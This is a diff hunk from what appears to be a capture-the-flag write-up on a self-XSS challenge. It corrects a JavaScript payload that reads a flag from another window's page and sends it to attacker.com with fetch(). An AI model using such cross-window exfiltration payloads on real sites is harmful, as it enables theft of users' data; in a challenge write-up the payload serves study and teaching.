@@ -85,6 +85,6 @@ document.location = 'http://note.m0lec.one:8080/note?id=2' //self-xss
 
 ```javascript
 w = window.open('','flag')
-flag = document.getElementsByTagName('p')[0].innerText
+flag = w.document.getElementsByTagName('p')[0].innerText
 fetch('https://attacker.com/flag?'+flag)
 ```
